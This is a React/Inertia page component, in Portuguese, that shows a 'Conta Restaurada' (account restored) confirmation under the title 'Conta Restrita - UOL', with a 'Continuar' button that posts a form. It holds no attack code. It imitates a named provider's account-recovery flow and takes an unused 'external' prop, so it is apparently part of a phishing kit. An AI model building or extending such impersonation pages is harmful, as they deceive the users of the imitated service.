import { SuccessIcon } from '@/components/icons';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardFooter, CardHeader } from '@/components/ui/card';
import Layout from '@/Layouts/Layout';
import { Head, useForm } from '@inertiajs/react';

export default function Restricted({external}: {external: string}) {
    const { post, processing } = useForm();
    return (
        <Layout>
            <Head title="Conta Restrita - UOL" />
            <Card className="mx-auto w-full max-w-sm space-y-10 rounded-none border-none shadow-none">
                <CardHeader>
                    <div className="flex h-12 p-2 break-words">
                        <SuccessIcon className="size-16 pr-2" />
                        <strong className="text-2xl text-[#484848]">
                            Conta <span className="text-[#e29933]">Restaurada</span>
                        </strong>
                    </div>
                </CardHeader>
                <CardContent className="text-center tracking-wide">
                    <p>
                        Sua conta foi restaurada com sucesso. Você pode acessar novamente todos os recursos e serviços disponíveis.
                    </p>
                    <p>
                        Se você tiver alguma dúvida ou precisar de assistência adicional, entre em contato com o suporte ao cliente.
                    </p>
                </CardContent>
                <CardFooter>
                    <Button
                        type="button"
                        onClick={() => post('')}
                        disabled={processing}
                        className="flex h-12 w-full justify-center rounded-xs bg-[#30AEEF] px-4 py-3 font-medium text-white transition-colors duration-200 hover:bg-[#00C7F4] active:bg-[#00C7F4] disabled:opacity-50"
                    >
                        Continuar
                    </Button>
                </CardFooter>
            </Card>
        </Layout>
    );
}
